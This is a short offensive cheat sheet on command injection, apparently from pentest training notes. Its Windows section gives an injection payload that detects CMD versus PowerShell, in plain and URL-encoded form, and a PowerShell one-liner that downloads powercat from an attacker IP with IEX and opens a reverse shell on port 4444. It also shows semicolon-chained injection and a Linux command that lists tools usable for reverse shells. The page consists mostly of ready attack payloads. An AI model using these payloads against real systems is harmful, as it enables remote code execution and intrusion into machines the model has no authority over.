# Command Injection



{% embed url="https://www.revshells.com/" %}

## Windows

try to inject arbitrary commands such as **ipconfig**, **ifconfig**, and **hostname**



Display CMD or Powershell depending where its executed:

{% code overflow="wrap" %}
```sh
(dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell
```
{% endcode %}

<pre data-overflow="wrap"><code><strong>(dir%202%3E%261%20*%60%7Cecho%20CMD)%3B%26%3C%23%20rem%20%23%3Eecho%20PowerShell
</strong></code></pre>

Download [powercat ](https://github.com/besimorhino/powercat)and execute a reverse shell:

{% code overflow="wrap" %}
```shell
cp /usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps1 .
```
{% endcode %}

{% code overflow="wrap" %}
```sh
IEX (New-Object System.Net.Webclient).DownloadString("http://192.168.119.3/powercat.ps1");powercat -c 192.168.119.3 -p 4444 -e powershell 
```
{% endcode %}

#### Combine commands with semicolon to get restricted ones to run:

```
git%3Bipconfig
```

## Linux

Enumerate available commands to acheive a reverse shell:

{% code overflow="wrap" %}
```sh
which nc bash python3 python perl php ruby socat awk curl wget telnet 2>/dev/null
```
{% endcode %}
